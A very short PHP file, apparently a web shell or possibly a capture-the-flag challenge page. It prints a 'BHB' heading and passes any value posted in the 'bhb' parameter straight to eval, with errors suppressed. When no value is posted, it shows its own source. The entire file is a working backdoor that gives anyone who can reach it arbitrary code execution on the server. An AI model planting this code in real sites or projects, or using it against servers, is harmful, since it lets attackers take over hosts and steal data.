<?php
    echo "<h1>🅱H🅱</h1>";
    if(isset($_POST['bhb'])){
        @eval($_POST['bhb']);
    } else {
        highlight_file(__FILE__);
    }
?>
